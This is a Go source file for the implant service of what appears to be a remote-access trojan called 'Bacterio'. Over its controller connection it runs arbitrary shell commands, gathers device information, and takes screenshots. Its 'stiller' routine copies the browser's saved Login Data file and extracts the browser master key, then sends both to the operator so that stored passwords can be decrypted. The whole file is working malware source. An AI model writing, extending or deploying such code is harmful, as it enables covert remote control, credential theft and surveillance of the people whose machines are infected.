package service

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"io/ioutil"
	"net"
	"os"

	"github.com/fatih/color"
	"github.com/fr13n8/Bacterio/internal/models"
	"github.com/fr13n8/Bacterio/pkg/system"
	"github.com/fr13n8/Bacterio/pkg/utils"
)

type ImplantService struct {
	Connection net.Conn
}

func NewImplantService(conn net.Conn) *ImplantService {
	return &ImplantService{
		Connection: conn,
	}
}

func (s *ImplantService) Send(request models.Message) error {
	marshal, err := json.Marshal(request)
	if err != nil {
		return err
	}
	encoded := base64.StdEncoding.EncodeToString(marshal)
	if err := s.Write(encoded); err != nil {
		color.Red("error sending command to client")
		return err
	}
	return nil
}

func (s *ImplantService) Write(v string) error {
	_, err := s.Connection.Write([]byte(v + "\n"))
	return err
}

func (s *ImplantService) Read() (*models.Message, error) {
	message, err := bufio.NewReader(s.Connection).ReadString('\n')
	if err != nil {
		color.Red("error reading response")
		return nil, err
	}
	decoded, err := base64.StdEncoding.DecodeString(message)
	if err != nil {
		color.Red("error decoding response")
		return nil, err
	}
	var response models.Message
	if err := json.Unmarshal(decoded, &response); err != nil {
		return nil, err
	}
	return &response, nil
}

func (s *ImplantService) GetInfoAboutDevice() error {
	info, err := utils.PrettyEncode(system.GetInfoAboutDevice())
	if err != nil {
		return err
	}

	if err := s.Send(models.Message{
		Command: "information",
		Data:    info,
	}); err != nil {
		return err
	}

	return nil
}

func (s *ImplantService) Run(cmd string) {
	output, err := system.RunCmd(cmd, 10)

	var errData models.Error
	if err != nil {
		errData = models.Error{
			HasError: true,
			Message:  err.Error(),
		}
	}

	err = s.Send(models.Message{
		Command: "terminal",
		Data:    output,
		Error:   errData,
	})
	if err != nil {
		color.Red("error sending command output")
		return
	}
}

type StillerResponse struct {
	MasterKey []byte `json:"master_key"`
}

func (s *ImplantService) RunStiller() {
	//Copy Login Data file to temp location
	dir := os.Getenv("APPDATA") + "\\tempfile.dat"
	err := utils.CopyFileToDirectory(utils.DataPath, dir)
	if err != nil {
		color.Red("error copy file to temp location")
		return
	}

	file, err := ioutil.ReadFile(dir)
	if err != nil {
		color.Red("error read file")
		return
	}

	masterKey, err := utils.GetMasterKey()
	if err != nil {
		color.Red("error get master key")
		return
	}

	err = s.Send(models.Message{
		Command:   "stiller",
		Data:      file,
		MasterKey: masterKey,
	})
	if err != nil {
		color.Red("error sending command output")
		return
	}
}

func (s *ImplantService) TakeScreenshot() {
	data, err := system.TakeScreenshot()
	if err != nil {
		color.Red("error taking screenshot")
	}

	err = s.Send(models.Message{
		Command: "screenshot",
		Data:    data,
	})
	if err != nil {
		color.Red("error sending screenshot")
		return
	}

}
